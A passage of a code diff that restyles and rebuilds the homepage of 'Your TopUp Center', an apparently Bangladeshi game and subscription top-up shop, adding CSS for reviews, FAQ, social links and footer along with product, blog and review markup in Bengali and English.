+            z-index: 0;
+            transform: rotate(-10deg);
+         }
+        .review-content {
+            position: relative;
+            z-index: 1;
+        }
+        .review-text {
+            font-style: italic;
+            color: var(--secondary-color);
+            margin-bottom: 25px; /* More space */
+            font-size: 1.05rem; /* Slightly larger text */
+            line-height: 1.8;
+        }
+        .reviewer-info {
+            display: flex;
+            align-items: center;
+            margin-top: 15px; /* Space before info */
+        }
+        .reviewer-info img {
+            width: 55px;
+            height: 55px;
+            border-radius: 50%;
+            margin-right: 15px;
+            object-fit: cover;
+            border: 3px solid var(--primary-color); /* Thicker border */
+            padding: 2px; /* Inner space */
+            background: var(--white-color); /* Ensure bg is white */
+        }
+        .reviewer-details h4 {
+            margin-bottom: 5px;
+            font-size: 1.15rem;
+            color: var(--dark-color);
+            font-weight: 600;
+        }
+        .reviewer-details span {
+            font-size: 0.95rem;
+            color: var(--secondary-color);
+        }
+        .rating {
+            margin-top: 15px; /* Space above rating */
+            color: var(--warning-color);
+            font-size: 1.1rem; /* Larger stars */
+        }
+         .rating i {
+             margin-right: 2px;
+         }
+
+
+        /* --- FAQ Section --- */
+        .faq-container {
+            max-width: 850px; /* Wider FAQ */
+            margin: 0 auto;
+        }
+        .faq-item {
+            background: var(--white-color);
+            margin-bottom: 18px; /* Increased spacing */
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow-light);
+            border: 1px solid #e7eaf0;
+            transition: margin-bottom var(--transition-speed);
+        }
+        .faq-question {
+            padding: 20px 30px;
+            font-weight: 600;
+            cursor: pointer;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: var(--dark-color);
+            font-size: 1.1rem; /* Larger question text */
+            transition: color var(--transition-speed);
+        }
+         .faq-question:hover {
+             color: var(--primary-color);
+         }
+        .faq-question::after {
+            content: '\f078'; /* Font Awesome chevron-down */
+            font-family: "Font Awesome 6 Free";
+            font-weight: 900;
+            transition: transform var(--transition-speed);
+            color: var(--primary-color);
+            font-size: 0.9em; /* Relative size */
+        }
+        .faq-item.active .faq-question {
+             color: var(--primary-color);
+        }
+        .faq-item.active .faq-question::after {
+            transform: rotate(180deg);
+        }
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease-out, padding 0.5s ease-out; /* Smoother transition */
+            padding: 0 30px;
+            color: var(--secondary-color);
+            line-height: 1.8;
+            font-size: 0.95rem;
+            border-top: 1px solid transparent; /* Prepare for border */
+        }
+         .faq-answer p {
+             margin-bottom: 1em; /* Space between paragraphs in answer */
+         }
+          .faq-answer p:last-child {
+             margin-bottom: 0;
+         }
+        .faq-item.active .faq-answer {
+            max-height: 400px; /* Increased max height */
+            padding: 20px 30px 25px;
+            border-top: 1px solid #e7eaf0; /* Show border when active */
+        }
+        .faq-item.active {
+            box-shadow: var(--box-shadow-medium); /* Highlight active item */
+             margin-bottom: 25px; /* Push next item down slightly */
         }
 
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        /* --- Social Media Section --- */
+        #social-media {
+            background-color: var(--dark-color);
+            color: var(--light-color);
+            padding: 60px 0;
+        }
+         #social-media .section-title {
+             color: var(--white-color);
+         }
+         #social-media .section-title::after {
+             background: linear-gradient(90deg, var(--primary-color), var(--info-color));
+         }
+        .social-links {
+            display: flex;
+            justify-content: center;
+            align-items: stretch; /* Make items equal height if needed */
+            flex-wrap: wrap;
+            gap: 25px; /* Reduced gap */
+        }
+        .social-link {
+            text-align: center;
+            color: var(--light-color);
+            transition: transform var(--transition-speed);
+            padding: 20px 15px; /* Adjusted padding */
+            flex-grow: 1; /* Allow items to grow */
+            min-width: 120px; /* Minimum width */
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: var(--border-radius);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .social-link:hover {
+             transform: translateY(-6px);
+             background-color: rgba(255, 255, 255, 0.1);
+        }
+        .social-link i {
+            font-size: 2.8rem; /* Slightly larger icon */
+            margin-bottom: 15px;
+            display: block;
+            transition: color var(--transition-speed);
+            line-height: 1; /* Prevent extra spacing */
+             width: 60px; /* Fixed width container for icon */
+             height: 60px; /* Fixed height container for icon */
+             display: flex;
+             justify-content: center;
+             align-items: center;
+             background: rgba(255,255,255,0.1); /* Subtle icon bg */
+             border-radius: 50%;
+        }
+        .social-link span {
+            display: block;
+            font-weight: 600; /* Bolder text */
+            font-size: 1.1rem;
+            margin-bottom: 5px; /* Space before count */
+        }
+        .social-link .count {
+            font-size: 0.9rem;
+            color: var(--secondary-color);
+             opacity: 0.8;
+        }
+        /* Specific colors for social icons */
+        .social-link.facebook i { color: #1877F2; background-color: rgba(24, 119, 242, 0.15); }
+        .social-link.twitter i { color: #1DA1F2; background-color: rgba(29, 161, 242, 0.15); }
+        .social-link.youtube i { color: #FF0000; background-color: rgba(255, 0, 0, 0.15); }
+        .social-link.instagram i { color: #E4405F; background-color: rgba(228, 64, 95, 0.15); }
+        .social-link.linkedin i { color: #0A66C2; background-color: rgba(10, 102, 194, 0.15); }
+
+        .social-link:hover i {
+            filter: brightness(1.1); /* Make icon slightly brighter on hover */
         }
 
-        @keyframes rotate-reverse {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(-360deg); }
+        /* --- Payment Methods Section --- */
+        #payment-methods {
+            background-color: #f7faff; /* Match alternating bg */
+            padding: 50px 0; /* Adjusted padding */
+            border-top: 1px solid #e9ecef;
+        }
+         #payment-methods .section-title {
+            font-size: 1.8rem; /* Smaller title */
+             margin-bottom: 30px;
+             padding-bottom: 15px;
+         }
+         #payment-methods .section-title::after {
+             width: 60px;
+             height: 3px;
+         }
+        .payment-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 30px 40px; /* Row and column gap */
+        }
+        .payment-logos img {
+            height: 45px; /* Slightly larger logos */
+            width: auto;
+            filter: grayscale(80%); /* Less grayscale */
+            opacity: 0.8;
+            transition: filter var(--transition-speed), opacity var(--transition-speed), transform var(--transition-speed);
+        }
+        .payment-logos img:hover {
+            filter: grayscale(0%);
+            opacity: 1;
+            transform: scale(1.1);
         }
 
-        @keyframes glow {
-            0% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.6), 0 0 60px rgba(0, 255, 255, 0.4), inset 0 0 30px rgba(0, 255, 255, 0.3); }
-            100% { box-shadow: 0 0 40px rgba(0, 255, 255, 0.8), 0 0 80px rgba(0, 255, 255, 0.6), inset 0 0 50px rgba(0, 255, 255, 0.5); }
+        /* --- Footer --- */
+        #main-footer {
+            background-color: #2c3e50; /* গাঢ় নেভি ব্লু */
+            color: rgba(255, 255, 255, 0.8); /* Slightly transparent text */
+            padding: 60px 0 20px;
+        }
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        .footer-widget h4 {
+            color: var(--white-color);
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            position: relative;
+            padding-bottom: 10px;
+            font-weight: 600;
+        }
+        .footer-widget h4::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            height: 2px;
+            width: 40px;
+            background-color: var(--primary-color);
+        }
+        .footer-widget p {
+            font-size: 0.95rem;
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+        .footer-widget ul li {
+            margin-bottom: 12px;
+        }
+        .footer-widget ul li a {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.95rem;
+            transition: color var(--transition-speed), padding-left var(--transition-speed);
+        }
+        .footer-widget ul li a:hover {
+            color: var(--white-color);
+            padding-left: 5px;
+        }
+         .footer-widget ul li a i {
+             margin-right: 8px;
+             width: 15px; /* Align icons */
+             color: var(--primary-color);
+         }
+         .footer-contact-info i {
+             margin-right: 10px;
+             color: var(--primary-color);
+             width: 20px; /* Align icons */
+             text-align: center;
+         }
+         .footer-social-links a {
+             color: rgba(255, 255, 255, 0.8);
+             font-size: 1.4rem;
+             margin-right: 15px;
+             transition: color var(--transition-speed), transform var(--transition-speed);
+             display: inline-block; /* Needed for transform */
+         }
+         .footer-social-links a:hover {
+             color: var(--white-color);
+             transform: scale(1.2);
+         }
+         .footer-social-links a:last-child {
+             margin-right: 0;
+         }
+
+        .footer-bottom {
+            border-top: 1px solid rgba(255, 255, 255, 0.15);
+            padding-top: 25px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .footer-bottom a {
+            color: var(--info-color);
+            font-weight: 500;
+        }
+        .footer-bottom a:hover {
+            color: var(--white-color);
+            text-decoration: underline;
         }
 
-       
-        @media only screen and (max-width: 768px) {
-            .loader {
-                width: 60px;
-                height: 60px;
+
+        /* --- Animations --- */
+         @keyframes rotateIcon {
+             from { transform: rotate(0deg); }
+             to { transform: rotate(360deg); }
+         }
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeInUp {
+             from { opacity: 0; transform: translateY(30px); }
+             to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 110, 255, 0.7); }
+            70% { box-shadow: 0 0 0 18px rgba(0, 110, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 110, 255, 0); }
+        }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateX(-50%) translateY(0); }
+            40% { transform: translateX(-50%) translateY(-20px); }
+            60% { transform: translateX(-50%) translateY(-10px); }
+        }
+         @keyframes marquee {
+            0%   { transform: translateX(0%); } /* Start immediately */
+            100% { transform: translateX(-100%); }
+         }
+        /* Animate on Scroll */
+        .fade-in {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.7s ease-out, transform 0.7s ease-out;
+        }
+        .fade-in.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+
+        /* --- Responsive Design --- */
+        @media (max-width: 992px) {
+            :root { --border-radius: 6px; } /* Slightly smaller radius */
+            .section-title { font-size: 2rem; }
+            #hero h1 { font-size: 3rem; }
+            #hero p { font-size: 1.2rem; }
+            .product-grid { grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 25px; }
+            .blog-grid { grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
+            .review-grid { grid-template-columns: 1fr; gap: 25px; } /* Stack reviews earlier */
+            .footer-grid { grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); }
+            .slide img { height: 350px; }
+            #early-access, #why-us { clip-path: none; margin-top: 0; margin-bottom: 0; padding: 70px 0; } /* Remove clip-path on smaller screens */
+        }
+
+        @media (max-width: 768px) {
+            h1 { font-size: 2.5rem; }
+            h2 { font-size: 1.8rem; }
+            .section-title { font-size: 1.9rem; margin-bottom: 40px; }
+            section { padding: 50px 0; }
+            #hero { height: auto; min-height: 550px; padding-bottom: 80px; clip-path: none; } /* Adjust hero */
+            #hero h1 { font-size: 2.6rem; }
+            #hero p { font-size: 1.1rem; max-width: 90%; }
+             .scroll-down { bottom: 30px; }
+
+            /* Mobile Navigation */
+            #main-nav {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                width: 100%;
+                background-color: var(--white-color);
+                box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+                flex-direction: column;
+                max-height: 0;
+                overflow: hidden;
+                transition: max-height 0.5s ease-out, box-shadow 0.5s ease-out; /* Smooth transition */
             }
+             #main-nav.active {
+                 display: flex;
+                 max-height: 500px; /* Allow it to expand */
+             }
+            #main-nav ul {
+                flex-direction: column;
+                width: 100%;
+                padding: 10px 0;
+            }
+            #main-nav ul li {
+                margin: 0;
+                text-align: left; /* Align left */
+            }
+            #main-nav ul li a {
+                display: block;
+                padding: 15px 25px; /* Add padding */
+                 border-bottom: 1px solid #eee;
+            }
+             #main-nav ul li:last-child a {
+                 border-bottom: none;
+             }
+             #main-nav ul li a::after { display: none; } /* Hide line animation */
+             #main-nav ul li a:hover {
+                 background-color: #f8f9fa; /* Add hover background */
+                 color: var(--primary-color);
+             }
+
+            .menu-toggle {
+                display: block; /* Show hamburger icon */
+            }
+
+            .why-us-content, .early-access-list, .social-links, .footer-grid {
+                 grid-template-columns: 1fr; /* Stack items */
+                 gap: 25px;
+            }
+             .product-grid, .blog-grid {
+                 grid-template-columns: 1fr; /* Single column */
+                 gap: 25px;
+             }
+             .footer-widget { text-align: center; } /* Center footer widget content */
+             .footer-widget h4::after { left: 50%; transform: translateX(-50%); } /* Center underline */
+             .footer-contact-info li { text-align: center; justify-content: center;}
+             .footer-contact-info i { display: inline-block; width: auto; }
+             .social-links { gap: 15px; }
+             .social-link { min-width: 100px; padding: 15px 10px;}
+             .social-link i { font-size: 2.2rem; width: 50px; height: 50px;}
+             .social-link span { font-size: 1rem;}
+             .filter-buttons button { padding: 8px 18px; font-size: 0.9rem; margin: 5px; }
+             .slide img { height: 300px; }
+             .payment-logos img { height: 35px; }
+             .faq-question { padding: 15px 20px; font-size: 1rem;}
+             .faq-answer { padding: 0 20px; }
+             .faq-item.active .faq-answer { padding: 15px 20px 20px; }
+
         }
+
+        @media (max-width: 576px) {
+             :root { --border-radius: 4px; }
+             #hero h1 { font-size: 2rem; }
+             #hero p { font-size: 1rem; }
+             #hero .btn { font-size: 1rem; padding: 12px 30px; }
+             .container { padding: 0 15px; }
+             section { padding: 40px 0; }
+             .section-title { font-size: 1.7rem; margin-bottom: 30px;}
+             .section-title i { font-size: 1.6rem; }
+             .product-item .price { font-size: 1.1rem; }
+             .slide img { height: 250px; }
+             .payment-logos img { height: 30px; }
+             .footer-grid { gap: 20px; }
+             .footer-widget h4 { font-size: 1.1rem; }
+             .footer-widget p, .footer-widget ul li a { font-size: 0.9rem; }
+             .footer-bottom { font-size: 0.85rem; }
+        }
+
     </style>
 </head>
-<body>
-    <div class="loading-container">
-        <div class="loader"></div>
+<body> <!-- Add class on scroll for header effect -->
+
+    <!-- Header -->
+    <header id="main-header">
+        <div class="container">
+            <div class="logo">
+                <a href="index.html">
+                  Your TopUp Center
+                </a>
+            </div>
+            <nav id="main-nav">
+                <ul>
+                    <li><a href="index.html">হোম</a></li>
+                    <li><a href="products.html">প্রোডাক্টস</a></li>
+                    <li><a href="#why-us">অফার</a></li>
+                    <li><a href="#blogs">ব্লগ</a></li>
+                    <li><a href="#faq">আমাদের সম্পর্কে</a></li>
+                    <li><a href="#footer-contact">যোগাযোগ</a></li>
+                    <li><a href="#">U Tech</a></li> <!-- Link to footer contact section -->
+                </ul>
+            </nav>
+             <div class="menu-toggle" id="menu-toggle">
+                <i class="fas fa-bars"></i>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <!-- Hero Section -->
+        <section id="hero">
+            <div class="container">
+                <h1>দ্রুত এবং নির্ভরযোগ্য টপ-আপ</h1>
+                <p>আপনার প্রয়োজনীয় সকল মোবাইল রিচার্জ, গেম টপ-আপ এবং বিল পেমেন্ট করুন সহজেই, এক প্ল্যাটফর্মে। নিরাপদ, দ্রুত এবং সর্বদা আপনার সেবায় নিয়োজিত।</p>
+                <a href="#products" class="btn">এক্সপ্লোর করুন <i class="fas fa-arrow-right"></i></a>
+            </div>
+            <div class="scroll-down">
+                <a href="#image-slider" aria-label="Scroll Down"><i class="fas fa-chevron-down"></i></a>
+            </div>
+        </section>
+
+        <!-- Image Slider -->
+        <section id="image-slider">
+             <div class="container">
+                <h2 class="section-title"><i class="fas fa-images"></i> Announcement</h2>
+                <div class="slider-container">
+                    <div class="slider-wrapper">
+                        <div class="slide">
+                            <img src="https://i.postimg.cc/Z59qj6fy/Picsart_24-08-27_13-00-16-092.jpg" alt="Offer 1">
+                        </div>
+                        <div class="slide">
+                            <img src="https://i.postimg.cc/g0XyqdX9/Picsart-24-08-19-19-45-45-108-copy-800x600.jpg" alt="Offer 2">
+                        </div>
+                        <div class="slide">
+                            <img src="https://i.postimg.cc/ncb446Zg/19526173-copy-800x600.jpg" alt="Offer 3">
+                        </div>
+                         <div class="slide">
+                            <img src="https://i.postimg.cc/SNGTvzkK/Picsart-24-12-01-11-44-36-437.jpg" alt="Offer 4">
+                        </div>
+                    </div>
+                    <div class="slider-nav">
+                        <button class="prev" aria-label="Previous Slide"><i class="fas fa-chevron-left"></i></button>
+                        <button class="next" aria-label="Next Slide"><i class="fas fa-chevron-right"></i></button>
+                    </div>
+                     <div class="slider-dots">
+                        <!-- Dots will be generated by JS -->
+                    </div>
+                </div>
+             </div>
+        </section>
+
+        <!-- Notice Section -->
+        <section id="notice">
+            <div class="container">
+                <div class="marquee-wrapper"> <!-- Added wrapper for better control -->
+                    <p><i class="fas fa-bullhorn"></i> বিশেষ ঘোষণা: Welcome to New Your TopUp Center Website ! 💝 Everything is Properly Working. ✨ &nbsp;  | &nbsp; Price List is on Update, Please Wait and Check Again in Few Time. 🧐</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Products Section -->
+        <section id="products">
+            <div class="container">
+                <h2 class="section-title"><i class="fas fa-shopping-bag"></i> আমাদের প্রোডাক্টস</h2>
+                <div class="filter-buttons">
+                    <button class="active" data-filter="all"><i class="fas fa-border-all"></i> সকল</button>
+                    <button data-filter="hot"><i class="fas fa-fire"></i> হট</button>
+                    <button data-filter="new"><i class="fas fa-star"></i> নতুন</button>
+                </div>
+                <div class="product-grid">
+                    <!-- Product Items - Initial state is opacity 0 set by CSS -->
+                   
+                    <div class="product-item all hot">
+                        <img src="https://i.postimg.cc/d3gjTt2V/Picsart-24-09-01-17-12-08-380.jpg" alt="Game TopUp">
+                        <div class="product-content">
+                            <h3><i class="fas fa-gamepad"></i> Free Fire UID TopUp Bangladesh </h3>
+                            <p>ইউআইডি দিয়ে দ্রুত ডায়মন্ড টপ-আপ করুন। *শুধুমাত্র বাংলাদেশ রিজিওনের জন্য প্রযোয্য!</p>
+                            <span class="price">৳২০ থেকে শুরু</span>
+                            <a href="free.html" class="btn">কিনুন <i class="fas fa-shopping-cart"></i></a>
+                        </div>
+                    </div>
+                     <div class="product-item all hot">
+                        <img src="https://i.postimg.cc/FsVQsjwD/Picsart-24-09-02-13-27-49-495.jpg" alt="Game TopUp 2">
+                        <div class="product-content">
+                            <h3><i class="fas fa-gamepad"></i> PUBG Mobile UC</h3>
+                            <p>ইনস্ট্যান্ট পাবজি ইউসি কিনুন সর্বনিম্ন মূল্যে।</p>
+                            <span class="price">৳৭৫ থেকে শুরু</span>
+                            <a href="#" class="btn">কিনুন <i class="fas fa-shopping-cart"></i></a>
+                        </div>
+                    </div>
+                  
+                     <div class="product-item all ">
+                        <img src="https://i.postimg.cc/qqvF4hQw/Picsart-24-09-03-21-25-55-620.jpg" alt="Gift Card">
+                        <div class="product-content">
+                            <h3><i class="fas fa-gamepad"></i> Teen Patti Chips</h3>
+                            <p>একদম কম দামে তিন পাট্টি চিপস্ কিনুন!</p>
+                            <span class="price">৳৩০ থেকে শুরু</span>
+                            <a href="#" class="btn">কিনুন <i class="fas fa-shopping-cart"></i></a>
+                        </div>
+                    </div>
+                     <div class="product-item all new">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5-a7ByGEW_Usl0LoJ766uqffITjAGgmIFC0Ald2QAeE_0KpO7zLiHAVE&s=10" alt="Internet Package">
+                        <div class="product-content">
+                            <h3><i class="fas fa-gamepad"></i> COC</h3>
+                            <p>COC এর Gems কিনুন একদম কম দামে এবং সহজে!</p>
+                            <span class="price">৳৩০ থেকে শুরু</span>
+                            <a href="#" class="btn">কিনুন <i class="fas fa-arrow-right"></i></a>
+                        </div>
+                    </div>
+                    <div class="product-item all new">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTO3r91pF1GW7-xY_U2PafqDyDMd8dUUdp9xd3XQYynlHP-qPCd877ifoic&s=10" alt="Gift Card">
+                        <div class="product-content">
+                            <h3><i class="fas fa-gift"></i> YouTube Premium</h3>
+                            <p>বিজ্ঞাপনমুক্ত ইউটিউব এক্সপ্লোর করুন!</p>
+                            <span class="price">৳১০০ থেকে শুরু</span>
+                            <a href="#" class="btn">কিনুন <i class="fas fa-shopping-cart"></i></a>
+                        </div>
+                    </div>
+                    
+                     <!-- Add more product items here -->
+                </div>
+            </div>
+        </section>
+
+        <!-- Early Access Products List -->
+        <section id="early-access">
+            <div class="container">
+                 <h2 class="section-title" style="color: #000;"><i class="fas fa-stopwatch"></i> শীঘ্রই আসছে</h2>
+                <div class="early-access-list">
+                     <div class="product-item fade-in">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRiX3Xw37t2S0_4-bs7ySNhCPSmAuAMuNZ3-IDCOkQofjc5skPzz-8lTIrj&s=10" alt="Gift Card">
+                        <div class="product-content">
+                            <h3><i class="fas fa-gift"></i> Netflix</h3>
+                            <p>নতুন সব Netflix Content উপভোগ করুন! জামেলা মুক্ত!</p>
+                            <span class="price"> -</span>
+                            <a href="#" class="btn">খুব শিঘ্রই আসছে <i class="fas fa-stopwatch"></i></a>
+                        </div>
+                    </div>
+                  <div class="product-item fade-in">
+                        <img src="https://admin.talhatopup.com/products/1728937476.webp" alt="Gift Card">
+                        <div class="product-content">
+                            <h3><i class="fas fa-gamepad"></i> Free Fire Evo Access BD</h3>
+                            <p>Free Fire Evo Access নিয়ে Evo King হয়ে যান!</p>
+                            <span class="price">-</span>
+                            <a href="#" class="btn">খুব শিঘ্রই আসছে <i class="fas fa-stopwatch"></i></a>
+                        </div>
+                    </div>
+                    <div class="product-item fade-in">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSAJMZPmuFUVGT9-LAQsDcP5UU0Cvcju3n3x1nEY5i16iv9KEJNoQljYAT0&s=10" alt="Gift Card">
+                        <div class="product-content">
+                            <h3><i class="fas fa-gamepad"></i> Special Airdrop FF-BD</h3>
+                            <p>Free Fire এর Airdrop কিনুন, শুধুমাত্র UID দিয়ে, কোনো User Info লাগবে না!</p>
+                            <span class="price">-</span>
+                            <a href="#" class="btn">খুব শিঘ্রই আসছে <i class="fas fa-stopwatch"></i></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+         <!-- Why Buy Us Section -->
+        <section id="why-us">
+            <div class="container">
+                <h2 class="section-title"><i class="fas fa-question-circle"></i> কেন আমাদের থেকে কিনবেন?</h2>
+                <div class="why-us-content">
+                    <div class="why-us-item fade-in">
+                        <i class="fas fa-shield-alt"></i>
+                        <h3>Trusted & Secure</h3>
+                        <p>আপনার প্রতিটি লেনদেন ১০০% নিরাপদ এবং সুরক্ষিত। আমরা আপনার তথ্যের গোপনীয়তা রক্ষা করি।</p>
+                    </div>
+                    <div class="why-us-item fade-in">
+                        <i class="fas fa-bolt"></i>
+                        <h3>Instant Delivery</h3>
+                        <p>পেমেন্টের সাথে সাথেই আপনার টপ-আপ সম্পন্ন হবে। কোনো দীর্ঘ অপেক্ষা নয়।</p>
+                    </div>
+                    <div class="why-us-item fade-in">
+                         <i class="fas fa-headset"></i>
+                        <h3>24/7 Support</h3>
+                        <p>যেকোনো প্রয়োজনে আমাদের সাপোর্ট টিম সর্বদা আপনার পাশে আছে।</p>
+                    </div>
+                     <div class="why-us-item fade-in">
+                        <i class="fas fa-tags"></i>
+                        <h3>Best Offers</h3>
+                        <p>আমরা সবসময় চেষ্টা করি মার্কেটের সেরা দামে সেরা অফারগুলো প্রদান করতে।</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- YouTube Video Section -->
+        <section id="video">
+            <div class="container">
+                <h2 class="section-title"><i class="fab fa-youtube"></i> আমাদের সম্পর্কে কিছু তথ্য</h2>
+                <div class="video-container fade-in">
+                    <!-- Replace VIDEO_ID with your actual YouTube video ID -->
+                    <iframe src="https://www.youtube.com/embed/s0Wp3LiSmao?rel=0&modestbranding=1&showinfo=0"  title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+                </div>
+            </div>
+        </section>
+
+        <!-- Blogs Section -->
+        <section id="blogs">
+            <div class="container">
+                 <h2 class="section-title"><i class="fas fa-blog"></i> সাম্প্রতিক ব্লগ পোস্ট</h2>
+                 <div class="blog-grid">
+                     <article class="blog-post fade-in">
+                        <div class="blog-img-container" style="overflow: hidden; border-radius: var(--border-radius) var(--border-radius) 0 0;">
+                         <img src="https://i.postimg.cc/1X5JSxs2/31168142.jpg" alt="Blog Post 1">
+                        </div>
+                         <div class="blog-content">
+                            <div class="blog-meta">
+                                <span><i class="fas fa-calendar-alt"></i> 29/10/2023 &nbsp;   5:00pm
+</span>
+                                <span><i class="fas fa-user"></i> অ্যাডমিন</span>
+                            </div>
+                             <h3>Development Description for Your TopUp Center Website</h3>
+                             <p>Hlw Friends. Welcome To Our Website . আমাদের....</p>
+                             <a href="#" class="read-more">আরও পড়ুন <i class="fas fa-long-arrow-alt-right"></i></a>
+                         </div>
+                     </article>
+                      <article class="blog-post fade-in">
+                        <div class="blog-img-container" style="overflow: hidden; border-radius: var(--border-radius) var(--border-radius) 0 0;">
+                         <img src="https://i.postimg.cc/QxdCPkH0/Blog-2.jpg" alt="Blog Post 2">
+                         </div>
+                         <div class="blog-content">
+                             <div class="blog-meta">
+                                <span><i class="fas fa-calendar-alt"></i> 14/03/2024   11:19pm</span>
+                                <span><i class="fas fa-user"></i> অ্যাডমিন</span>
+                            </div>
+                             <h3>YTC - FACEBOOK Page Post Type Changing Alart -- Blog 2</h3>
+                             <p>#YTC24 - এর সর্বোমোট ৪ টি ফেসবুক পেজ রয়েছে । যেখানে দুটোতে Your TopUp Center - এর...</p>
+                             <a href="#" class="read-more">আরও পড়ুন <i class="fas fa-long-arrow-alt-right"></i></a>
+                         </div>
+                     </article>
+                      <article class="blog-post fade-in">
+                         <div class="blog-img-container" style="overflow: hidden; border-radius: var(--border-radius) var(--border-radius) 0 0;">
+                         <img src="https://via.placeholder.com/400x220/aabbcc/ffffff?text=Blog+Image+3" alt="Blog Post 3">
+                         </div>
+                         <div class="blog-content">
+                             <div class="blog-meta">
+                                <span><i class="fas fa-calendar-alt"></i> অক্টোবর ১৫, ২০২৩</span>
+                                <span><i class="fas fa-user"></i> অ্যাডমিন</span>
+                            </div>
+                             <h3>অনলাইন পেমেন্টের নিরাপত্তা টিপস</h3>
+                             <p>অনলাইনে লেনদেন করার সময় কোন বিষয়গুলো খেয়াল রাখলে আপনি সুরক্ষিত থাকবেন...</p>
+                             <a href="#" class="read-more">আরও পড়ুন <i class="fas fa-long-arrow-alt-right"></i></a>
+                         </div>
+                     </article>
+                 </div>
+            </div>
+        </section>
+
+        <!-- Review Section -->
+        <section id="reviews">
+            <div class="container">
+                 <h2 class="section-title"><i class="fas fa-comments"></i> গ্রাহকদের মতামত</h2>
+                 <div class="review-grid">
+                     <div class="review-card fade-in">
+                         <div class="review-content">
+                             <div class="rating"> <!-- Rating moved above text -->
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                             </div>
+                             <p class="review-text">"খুবই দ্রুত সার্ভিস! পেমেন্ট করার সাথে সাথেই রিচার্জ পেয়ে গেছি। ধন্যবাদ!"</p>
+                             <div class="reviewer-info">
+                                 <img src="https://i.postimg.cc/Fz725dRv/1724334014093-01.jpg" alt="Reviewer 1">
+                                 <div class="reviewer-details">
+                                     <h4>MD Saroyar Khan</h4>
+                                     <span><i class="fas fa-map-marker-alt"></i> ঢাকা</span>
+                                 </div>
+                             </div>
+                         </div>
+                     </div>
+                      <div class="review-card fade-in">
+                         <div class="review-content">
+                             <div class="rating">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star-half-alt"></i>
+                             </div>
+                             <p class="review-text">"গেম টপ-আপের জন্য এটাই সেরা জায়গা। দামও কম, ডেলিভারিও ফাস্ট।"</p>
+                             <div class="reviewer-info">
+                                 <img src="https://i.postimg.cc/RFCkdbxN/ab17d59d-0722-4aba-9088-056811987a03-1-01.jpg" alt="Reviewer 2">
+                                 <div class="reviewer-details">
+                                     <h4>Fatema Jannat</h4>
+                                     <span><i class="fas fa-map-marker-alt"></i> চট্টগ্রাম</span>
+                                 </div>
+                             </div>
+                         </div>
+                     </div>
+                       <div class="review-card fade-in">
+                         <div class="review-content">
+                             <div class="rating">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="far fa-star"></i>
+                             </div>
+                             <p class="review-text">"ওয়েবসাইটের ডিজাইনটা সুন্দর আর ব্যবহার করাও খুব সহজ। সাপোর্ট টিমও অনেক হেল্পফুল।"</p>
+                             <div class="reviewer-info">
+                                 <img src="https://i.postimg.cc/bYVhC8J8/IMG-20240809-114522-01.jpg" alt="Reviewer 3">
+                                 <div class="reviewer-details">
+                                     <h4>Jhb Jahid Hasan Bakir</h4>
+                                     <span><i class="fas fa-map-marker-alt"></i> খুলনা</span>
+                                 </div>
+                             </div>
+                         </div>
+                     </div>
+                 </div>
+            </div>
+        </section>
+
+        <!-- FAQ Section -->
+        <section id="faq">
+            <div class="container">
+                <h2 class="section-title"><i class="fas fa-question-circle"></i> সাধারণ প্রশ্নোত্তর (FAQ)</h2>
+                <div class="faq-container">
+                    <div class="faq-item fade-in">
+                        <div class="faq-question">টপ-আপ করতে কতক্ষণ সময় লাগে?</div>
+                        <div class="faq-answer">
